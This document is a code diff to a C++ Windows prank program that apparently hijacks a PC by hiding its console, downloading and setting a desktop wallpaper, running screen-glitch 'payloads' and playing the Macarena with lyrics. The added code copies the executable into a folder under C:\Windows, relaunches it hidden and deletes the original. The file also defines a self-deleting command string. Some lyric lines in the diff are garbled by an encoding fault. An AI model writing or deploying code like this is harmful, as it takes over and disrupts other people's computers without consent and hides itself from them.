@@ -16,6 +16,7 @@
 #include <cassert>
 #include <map>
 #pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "winmm")
 
 #define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
@@ -41,6 +42,26 @@ void DelMe()
      Wallpaper -> 303791
      Macarena -> 40739508
 */
+std::string executable_name()
+{
+#if defined(PLATFORM_POSIX) || defined(__linux__) //check defines for your setup
+
+    std::string sp;
+    std::ifstream("/proc/self/comm") >> sp;
+    return sp;
+
+#elif defined(_WIN32)
+
+    char buf[MAX_PATH];
+    GetModuleFileNameA(nullptr, buf, MAX_PATH);
+    return buf;
+
+#else
+
+    static_assert(false, "unrecognized platform");
+
+#endif
+}
 
 namespace std {
     LPWSTR toLPWSTR(std::string instr) {
@@ -121,9 +142,20 @@ namespace Payloads {
         payloadCoroutine.push_back(std::thread(SCREEN_BUG));
     }
 }
+std::wstring s2ws(const std::string& s)
+{
+    int len;
+    int slength = (int)s.length() + 1;
+    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
+    wchar_t* buf = new wchar_t[len];
+    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
+    std::wstring r(buf);
+    delete[] buf;
+    return r;
+}
 
-std::string wallpaper = "C:\\Calbuuuus\\mauriescalboxdddddddCALBISIE.png";
-std::string soundThing = "C:\\Calbuuuus\\yathusableeeemfskfmdsl.wav";
+std::string wallpaper = "C:\\Windows\\Calbus\\mauriescalboxdddddddCALBISIE.png";
+std::string soundThing = "C:\\Windows\\Calbus\\yathusableeeemfskfmdsl.wav";
 
 BOOL isMacarenaPlaying = 0;
 std::vector<std::thread> coroutine;
@@ -166,9 +198,9 @@ namespace Lyrics {
         addLyric(442,"So they all come and dance beside me");
         addLyric(469,"Move with me, chant with me");
         addLyric(490,"And if you're good I'll take you home with me");
-        addLyric(509,"Dale a tu cuerpo alegría Macarena");
+        addLyric(509,"Dale a tu cuerpo alegrÃ­a Macarena");
         addLyric(530,"Que tu cuerpo es pa' darle alegria y cosa buena");
-        addLyric(560,"Dale a tu cuerpo alegría Macarena");
+        addLyric(560,"Dale a tu cuerpo alegrÃ­a Macarena");
         addLyric(580,"Heee");
         addLyric(583, "Heee");
         addLyric(584, "Heee");
@@ -178,9 +210,9 @@ namespace Lyrics {
         addLyric(588, "Heee");
         addLyric(589, "Heey");
         addLyric(590, "Macarena");
-        addLyric(605, "Dale a tu cuerpo alegría Macarena");
+        addLyric(605, "Dale a tu cuerpo alegrÃ­a Macarena");
         addLyric(620, "Que tu cuepo es pa' darle alegria y cosa buena");
-        addLyric(651, "Dale a tu cuerpo alegría Macarena");
+        addLyric(651, "Dale a tu cuerpo alegrÃ­a Macarena");
         addLyric(670, "Heee");
         addLyric(671, "Heee");
         addLyric(672, "Heee");
@@ -223,13 +255,29 @@ namespace Lyrics {
     }
 }
 
-int main()
+int main(int argc, char* argv[], char* envp[])
 {
     Payloads::init();
     Lyrics::initLyrics();
     std::thread currentThread;
     FreeConsole();
-    system("md C:\\Calbuuuus");
+    system("md C:\\Windows\\Calbus");
+    if (executable_name() != "C:\\Windows\\Calbus\\executable_xd.exe") {
+        CopyFileA(executable_name().c_str(),"C:\\Windows\\Calbus\\executable_xd.exe",0);
+        std::string sysDel = "C:\\Windows\\Calbus\\executable_xd.exe yes \"" + executable_name() + "\"";
+        STARTUPINFO si = { 0 };
+        PROCESS_INFORMATION pi = { 0 };
+        std::wstring lvi = s2ws(sysDel);
+        const wchar_t* cwChar = lvi.c_str();
+        wchar_t* wChar = (wchar_t*)cwChar;
+        CreateProcessW(NULL, wChar, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        return 0;
+    }
+    if (argc != 3)
+        return 0;
+    if (!strstr(argv[1],"yes"))
+        return 0;
+    DeleteFileA(argv[2]);
     /* Download required files for running. */
     LPCSTR wpDlWebsite = "https://i.imgur.com/EFRtiJK.png";
     if (!fileUtils::file_check(wallpaper, 303791)) {
@@ -244,7 +292,7 @@ int main()
     Sleep(100);
     currentThread = std::thread(playMacarena);
     SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, std::toLPWSTR(wallpaper), SPIF_UPDATEINIFILE);
-    
+
     while (playMacarena) {
         Lyrics::doLyric(uKnow);
         const char * uKnowChar = std::to_string(uKnow).c_str();
